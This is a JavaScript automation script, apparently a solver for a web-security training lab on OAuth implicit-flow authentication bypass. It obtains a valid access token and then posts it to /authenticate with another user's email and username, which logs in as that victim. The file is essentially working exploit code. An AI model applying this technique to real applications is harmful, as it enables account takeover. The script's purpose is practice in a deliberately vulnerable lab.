const { finishSocialProviderAuth, runLab } = require('./_common.cjs');

const TITLE = 'Authentication bypass via OAuth implicit flow';
const PATH = '/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow';

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 15000 });
    const authUrl = await page.evaluate(() => {
      const meta = document.querySelector('meta[http-equiv="refresh" i]');
      const content = meta?.getAttribute('content') || '';
      return content.match(/url=(.*)$/i)?.[1] || null;
    });
    if (!authUrl) {
      throw new Error('OAuth redirect URL not found');
    }
    await page.goto(authUrl, { waitUntil: 'domcontentloaded', timeout: 20000 });
    await finishSocialProviderAuth(page);

    const current = new URL(page.url());
    const hash = new URLSearchParams(current.hash.replace(/^#/, ''));
    const token = hash.get('access_token') || current.searchParams.get('access_token');
    if (!token) {
      throw new Error('OAuth access token not found in callback');
    }

    await page.evaluate(async (value) => {
      const response = await fetch('/authenticate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'carlos@carlos-montoya.net',
          username: 'carlos',
          token: value,
        }),
      });
      return response.text();
    }, token);

    await page.goto(labUrl + '/my-account?id=carlos', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
    await page.waitForTimeout(1200);
  },
});
